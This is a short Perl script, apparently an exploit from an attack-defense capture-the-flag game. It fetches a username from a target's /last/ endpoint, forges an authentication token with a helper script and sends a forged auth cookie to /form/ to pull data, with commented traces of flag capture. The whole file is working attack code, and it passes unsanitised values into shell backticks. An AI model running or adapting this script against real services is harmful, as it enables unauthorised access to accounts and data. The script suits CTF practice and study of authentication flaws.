#!/usr/bin/perl

$host=shift;

$stm='curl -H "Host: mig.'.$host.'" -s http://'.$host.'/last/ --max-time 5 | grep -oP \'"\K[^"]+\' | head -1 | tr \'\\n\' \' \'';
#print $stm."\n";
$ret=`$stm`;

#print $ret;
$user=$ret;

#print "USER:$user";

$stm2='python2 hmac_sha3.py '.$ret;
#print $stm2."\n";
$ret2=`$stm2`;
#print $ret2."\n";


$token=$ret2;
chomp $token;

$stm3='curl -H "Host: mig.'.$host.'" -s http://'.$host."/form/ --max-time 5 --cookie \"auth=$token:$user\"".' --data \'{"action":"load","fields":{},"state":""}\'';
#print $stm3."\n";

$ret3=`$stm3`;
print $ret3."\n"; 

#$ret3=$flag;

#/^\w{31}=$/
